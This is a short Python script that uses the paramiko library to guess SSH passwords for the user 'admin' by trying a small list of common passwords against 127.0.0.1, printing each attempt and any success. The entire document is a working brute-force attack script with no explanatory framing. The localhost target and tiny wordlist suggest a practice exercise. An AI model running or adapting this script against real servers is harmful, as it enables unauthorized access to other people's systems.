import paramiko

target_ip = "127.0.0.1"
username = "admin"
password_list = ["admin", "1234", "password", "test"]

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for password in password_list:
    try:
        print(f"[?] Trying password: {password}")
        ssh.connect(target_ip, port=22, username=username, password=password, timeout=3)
        print(f"[+] SUCCESS! Password found: {password}")
        ssh.close()
        break
    except paramiko.AuthenticationException:
        print("[-] Wrong password")
    except Exception as e:
        print(f"[!] Error: {e}")
        break
